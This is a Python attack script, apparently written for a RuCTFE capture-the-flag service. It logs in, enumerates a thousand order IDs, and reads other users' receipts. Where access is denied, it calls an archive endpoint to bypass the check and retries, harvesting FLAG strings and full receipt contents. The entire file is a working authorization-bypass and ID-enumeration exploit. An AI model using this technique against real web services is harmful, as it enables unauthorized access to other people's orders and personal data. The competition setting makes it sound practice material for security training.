import requests
import re
from time import sleep

# Base URL
BASE_URL = "http://0-3000.cks.sa.ructfe.org"

# Credentials
USERNAME = "<dummy_username>"
PASSWORD = "<dummy_password>"

def authenticate():
    """Perform two-step authentication flow"""
    # Create session with connection limits
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=1,
        pool_maxsize=1,
        max_retries=0
    )
    session.mount('http://', adapter)
    
    print("[*] Authenticating...")
    try:
        # Step 1: Submit username
        resp1 = session.post(
            f"{BASE_URL}/login",
            data={"username": USERNAME},
            allow_redirects=False,
            timeout=10
        )
        
        # Extract user_id
        user_id_match = re.search(r'user_id["\s:=]+(\d+)', resp1.text)
        if not user_id_match:
            print(f"[-] Failed to extract user_id")
            return None
        
        user_id = user_id_match.group(1)
        print(f"[+] user_id: {user_id}")
        
        # Step 2: Submit password
        resp2 = session.post(
            f"{BASE_URL}/login",
            data={"user_id": user_id, "password": PASSWORD},
            allow_redirects=False,
            timeout=10
        )
        
        if resp2.status_code in [200, 302]:
            print(f"[+] Authenticated - cookies: {dict(session.cookies)}")
            return session
        else:
            print(f"[-] Auth failed: {resp2.status_code}")
            return None
    except Exception as e:
        print(f"[-] Auth error: {e}")
        return None

def main():
    session = authenticate()
    if not session:
        return
    
    print("\n" + "="*80)
    print("ENUMERATING ORDERS 300000-300999")
    print("="*80 + "\n")
    
    authorized = []
    unauthorized = []
    non_existent = []
    flags = []
    archived_success = []
    
    for order_id in range(300000, 301000):
        if (order_id - 300000) % 100 == 0:
            print(f"\n[{order_id}] Auth:{len(authorized)} Unauth:{len(unauthorized)} 404:{len(non_existent)} Flags:{len(flags)}")
        
        try:
            # Check receipt
            r = session.get(
                f"{BASE_URL}/order/{order_id}/receipt",
                allow_redirects=False,
                timeout=3
            )
            
            if r.status_code == 200:
                authorized.append(order_id)
                print(f"[200] {order_id}")
                
                # Search for flags
                flag_matches = re.findall(r'FLAG\{[^}]+\}', r.text)
                if flag_matches:
                    for flag in flag_matches:
                        print(f"[FLAG] {order_id}: {flag}")
                        flags.append((order_id, flag, r.text))
                
            elif r.status_code == 401:
                unauthorized.append(order_id)
                print(f"[401] {order_id} -> archiving", end='')
                
                # Archive
                try:
                    ar = session.get(
                        f"{BASE_URL}/order/{order_id}/archive",
                        allow_redirects=False,
                        timeout=3
                    )
                    print(f" [{ar.status_code}]", end='')
                    
                    if ar.status_code == 200:
                        sleep(0.02)
                        # Retry receipt
                        rr = session.get(
                            f"{BASE_URL}/order/{order_id}/receipt",
                            allow_redirects=False,
                            timeout=3
                        )
                        print(f" retry[{rr.status_code}]", end='')
                        
                        if rr.status_code == 200:
                            archived_success.append(order_id)
                            print(f" ACCESS!")
                            
                            flag_matches = re.findall(r'FLAG\{[^}]+\}', rr.text)
                            if flag_matches:
                                for flag in flag_matches:
                                    print(f"[FLAG] {order_id}: {flag}")
                                    flags.append((order_id, flag, rr.text))
                        else:
                            print()
                    else:
                        print()
                except Exception as e:
                    print(f" err:{e}")
                
            elif r.status_code == 404:
                non_existent.append(order_id)
            
            sleep(0.01)  # Small delay between requests
            
        except Exception as e:
            print(f"[ERR] {order_id}: {e}")
    
    # Summary
    print("\n" + "="*80)
    print("SUMMARY")
    print("="*80)
    print(f"Authorized (200): {len(authorized)}")
    if authorized:
        print(f"  {authorized}")
    
    print(f"\nUnauthorized (401): {len(unauthorized)}")
    if unauthorized[:30]:
        print(f"  First 30: {unauthorized[:30]}")
    
    print(f"\nNon-existent (404): {len(non_existent)}")
    
    print(f"\nArchived successfully: {len(archived_success)}")
    if archived_success:
        print(f"  {archived_success}")
    
    print(f"\n{'='*80}")
    print(f"FLAGS: {len(flags)}")
    print("="*80)
    if flags:
        for oid, flag, content in flags:
            print(f"\n[Order {oid}] {flag}")
            print(f"Content:\n{content}\n")
    else:
        print("No flags found")

if __name__ == "__main__":
    main()

